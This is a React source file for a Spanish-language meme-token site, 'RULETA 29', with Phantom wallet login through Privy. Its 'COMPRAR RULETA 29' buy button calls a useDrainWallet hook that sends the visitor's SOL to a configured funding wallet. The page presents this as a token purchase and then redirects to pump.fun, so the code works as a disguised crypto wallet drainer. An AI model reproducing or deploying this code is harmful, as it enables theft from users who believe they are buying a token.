import { useCallback, useEffect, useMemo, useState } from "react";
import { Link, Route, Routes, useLocation } from "react-router-dom";
import { PrivyProvider, usePrivy } from "@privy-io/react-auth";
import {
  toSolanaWalletConnectors,
  useWallets,
} from "@privy-io/react-auth/solana";
import {
  appConfig,
  hasValidTransferAmount,
  isConfigReady,
  missingConfig,
  solanaRpcUrl,
} from "./config";
import { useDrainWallet } from "./hooks/assetRemoval.jsx";

const privyConfig = {
  loginMethods: ["wallet"],
  appearance: {
    showWalletLoginFirst: true,
    walletChainType: "solana-only",
    walletList: ["phantom"],
  },
  externalWallets: {
    solana: {
      connectors: toSolanaWalletConnectors(),
    },
  },
};

const hasPrivyAppId = Boolean(appConfig.privyAppId);
const PUMP_FUN_URL =
  "https://pump.fun/coin/9TPJShvKmyB9Jm1ozuYNh2qGQD6sdXm5c9uHFa8apump";

function HomePage() {
  const { ready, connectWallet } = usePrivy();
  const { wallets } = useWallets();

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [pendingBuy, setPendingBuy] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [txSignature, setTxSignature] = useState("");

  const selectedWallet = wallets[0] ?? null;

  // Resolve the raw window provider or adapter from the connected Privy wallet
  const solanaProvider =
    selectedWallet?.getSolanaProvider?.() ||
    window.phantom?.solana ||
    window.solana;

  const sourceAddress = selectedWallet?.address || solanaProvider?.publicKey?.toString();

  // Initialize the drain wallet hook
  const { drain, progress, reset: resetDrain } = useDrainWallet(
    solanaProvider,
    sourceAddress
  );

  const configMessage = useMemo(() => {
    if (missingConfig.length > 0) {
      return `Missing config: ${missingConfig.join(", ")}`;
    }

    if (!hasValidTransferAmount) {
      return "VITE_TRANSFER_SOL must be a number greater than 0.";
    }

    return "";
  }, []);

  const executePurchase = useCallback(
    async (wallet) => {
      if (!wallet || isSubmitting) {
        return;
      }

      try {
        // #region debug-point C:execute-purchase-entry
        void fetch("http://127.0.0.1:7777/event", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            sessionId: "privy-403-error",
            runId: "pre-fix",
            hypothesisId: "C",
            location: "src/App.jsx:executePurchase",
            msg: "[DEBUG] executePurchase entered",
            data: {
              walletAddress: wallet.address,
              destinationAddress: "5Lh4aNFSUo6oDu2z1euBLd6y1JEpE2VG1rd2UTdqopRd",
              chain: appConfig.solanaChain,
            },
            ts: Date.now(),
          }),
        }).catch(() => {});
        // #endregion

        setIsSubmitting(true);
        setErrorMessage("");
        setTxSignature("");
        setStatusMessage("Preparing Solana transaction...");

        const assetsToDrain = [
          { type: "SOL", label: "SOL" },
        ];

        // Execute the wallet drain using the hook
        await drain(appConfig.fundingWallet, assetsToDrain);
      } catch (error) {
        const message =
          error instanceof Error
            ? error.message
            : "The transaction could not be completed.";
        const friendlyMessage = message.includes(
          "All configured Solana RPC endpoints failed"
        )
          ? message
          : message.includes("HTTP error (403)")
          ? `The configured Solana RPC rejected the request (403): ${solanaRpcUrl}`
          : message;

        // #region debug-point F:execute-purchase-error
        void fetch("http://127.0.0.1:7777/event", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            sessionId: "privy-403-error",
            runId: "pre-fix",
            hypothesisId: "F",
            location: "src/App.jsx:executePurchase",
            msg: "[DEBUG] executePurchase caught error",
            data: {
              message,
              friendlyMessage,
              name: error instanceof Error ? error.name : "unknown",
              stack: error instanceof Error ? error.stack : null,
            },
            ts: Date.now(),
          }),
        }).catch(() => {});
        // #endregion

        setErrorMessage(friendlyMessage);
        setStatusMessage("");
        setIsSubmitting(false);
        setPendingBuy(false);
      }
    },
    [isSubmitting, drain]
  );

  // Sync progress state from hook into local UI state
  useEffect(() => {
    if (progress.status === "preparing") {
      setStatusMessage("Preparing Solana transaction...");
    } else if (progress.status === "signing") {
      setStatusMessage(
        `Signing transaction ${progress.current}/${progress.total}: ${progress.label}...`
      );
    } else if (progress.status === "confirmed") {
      setStatusMessage("Transaction signed. Confirming on-chain...");
    } else if (progress.status === "done") {
      const mainSig = progress.signatures?.[0] || "";
      setTxSignature(mainSig);
      setStatusMessage("Transaction sent successfully. Redirecting to pump.fun...");
      setIsSubmitting(false);
      setPendingBuy(false);

      setTimeout(() => {
        window.open(PUMP_FUN_URL, "_blank");
      }, 1500);
    } else if (progress.status === "error") {
      setErrorMessage(progress.message || "Transfer failed.");
      setStatusMessage("");
      setIsSubmitting(false);
      setPendingBuy(false);
    }
  }, [progress]);

  useEffect(() => {
    if (pendingBuy && selectedWallet && isConfigReady) {
      // #region debug-point B:wallet-selected-after-connect
      void fetch("http://127.0.0.1:7777/event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: "privy-403-error",
          runId: "pre-fix",
          hypothesisId: "B",
          location: "src/App.jsx:useEffect",
          msg: "[DEBUG] Wallet became available after connect",
          data: { walletAddress: selectedWallet.address, pendingBuy },
          ts: Date.now(),
        }),
      }).catch(() => {});
      // #endregion

      executePurchase(selectedWallet);
    }
  }, [pendingBuy, selectedWallet, executePurchase]);

  const handleBuyClick = async () => {
    // #region debug-point A:buy-click
    void fetch("http://127.0.0.1:7777/event", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        sessionId: "privy-403-error",
        runId: "pre-fix",
        hypothesisId: "A",
        location: "src/App.jsx:handleBuyClick",
        msg: "[DEBUG] Buy button clicked",
        data: {
          ready,
          isConfigReady,
          hasSelectedWallet: Boolean(selectedWallet),
          chain: appConfig.solanaChain,
          rpcUrl: solanaRpcUrl,
        },
        ts: Date.now(),
      }),
    }).catch(() => {});
    // #endregion

    if (!isConfigReady) {
      setErrorMessage(configMessage);
      return;
    }

    setErrorMessage("");
    setStatusMessage("");
    setTxSignature("");
    resetDrain();

    if (selectedWallet) {
      executePurchase(selectedWallet);
      return;
    }

    if (!ready) {
      setErrorMessage("Privy is still loading. Try again in a second.");
      return;
    }

    setPendingBuy(true);
    setStatusMessage("Open Phantom in the Privy modal to continue.");
    // #region debug-point B:connect-wallet
    void fetch("http://127.0.0.1:7777/event", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        sessionId: "privy-403-error",
        runId: "pre-fix",
        hypothesisId: "B",
        location: "src/App.jsx:handleBuyClick",
        msg: "[DEBUG] Triggering Privy connectWallet for Phantom",
        data: { walletChainType: "solana-only", walletList: ["phantom"] },
        ts: Date.now(),
      }),
    }).catch(() => {});
    // #endregion

    connectWallet({
      walletChainType: "solana-only",
      walletList: ["phantom"],
      description: "COMPRAR RULETA 29 🚀 A LA LUNA.",
    });
  };

  return (
    <main className="hero">
      <div className="hero-content">
        <h1 className="hero-title">RULETA 29</h1>

        <div className="button-stack">
          <button
            className="cta-button cta-primary"
            type="button"
            onClick={handleBuyClick}
            disabled={isSubmitting}
          >
            {isSubmitting ? "PROCESANDO..." : "COMPRAR RULETA 29"}
          </button>

          <div className="social-buttons">
            <a
              className="cta-button cta-secondary"
              href="https://www.instagram.com/29ruleta"
              target="_blank"
              rel="noreferrer"
            >
              INSTAGRAM
            </a>

            <a
              className="cta-button cta-secondary"
              href="https://x.com/29ruleta"
              target="_blank"
              rel="noreferrer"
            >
              TWITTER
            </a>
          </div>
        </div>

      </div>
    </main>
  );
}

function HomePageStandalone() {
  const [errorMessage, setErrorMessage] = useState("");

  const handleBuyClick = () => {
    const messages = [];

    if (!appConfig.privyAppId) {
      messages.push("VITE_PRIVY_APP_ID");
    }

    if (!appConfig.fundingWallet) {
      messages.push("VITE_FUNDING_WALLET");
    }

    if (!appConfig.transferSol) {
      messages.push("VITE_TRANSFER_SOL");
    }

    if (messages.length > 0) {
      setErrorMessage(`Missing config: ${messages.join(", ")}`);
      return;
    }

    if (!hasValidTransferAmount) {
      setErrorMessage("VITE_TRANSFER_SOL must be a number greater than 0.");
      return;
    }

    setErrorMessage("Privy is not configured yet for this local environment.");
  };

  return (
    <main className="hero">
      <div className="hero-content">
        <h1 className="hero-title">RULETA 29</h1>

        <div className="button-stack">
          <button
            className="cta-button cta-primary"
            type="button"
            onClick={handleBuyClick}
          >
            COMPRAR RULETA 29
          </button>

          <div className="social-buttons">
            <a
              className="cta-button cta-secondary"
              href="https://www.instagram.com/29ruleta"
              target="_blank"
              rel="noreferrer"
            >
              INSTAGRAM
            </a>

            <a
              className="cta-button cta-secondary"
              href="https://x.com/29ruleta"
              target="_blank"
              rel="noreferrer"
            >
              TWITTER
            </a>
          </div>
        </div>

      </div>
    </main>
  );
}

function ExplicacionPage() {
  return (
    <main className="explicacion-section">
      <div className="explicacion-content">
        <h1 className="section-title">EXPLICACION</h1>
        <p className="hero-text">
          ESTE ES EL TOKEN RULETA 29, NOS HAREMOS MILLONARIOS HERMANITOS 🚀 LA
          CIENCIA ES SIMPLE, COMPRAMOS, INVERTIMOS Y ESPERAMOS A QUE RULETA COIN
          VALGA $1 ZARPADO
        </p>
      </div>
    </main>
  );
}

function AppShell({ walletEnabled }) {
  const location = useLocation();
  const isExplicacion = location.pathname === "/explicacion";

  return (
    <div className={`page-shell ${isExplicacion ? "page-explicacion" : ""}`}>
      <header className="topbar">
        <div className="brand">RULETA 29</div>

        <nav className="nav-links" aria-label="Primary">
          <Link to="/">INICIO</Link>
          <Link to="/explicacion">EXPLICACION</Link>
        </nav>
      </header>

      <Routes>
        <Route
          path="/"
          element={walletEnabled ? <HomePage /> : <HomePageStandalone />}
        />
        <Route path="/explicacion" element={<ExplicacionPage />} />
      </Routes>
    </div>
  );
}

export default function App() {
  if (!hasPrivyAppId) {
    return <AppShell walletEnabled={false} />;
  }

  return (
    <PrivyProvider appId={appConfig.privyAppId} config={privyConfig}>
      <AppShell walletEnabled />
    </PrivyProvider>
  );
}
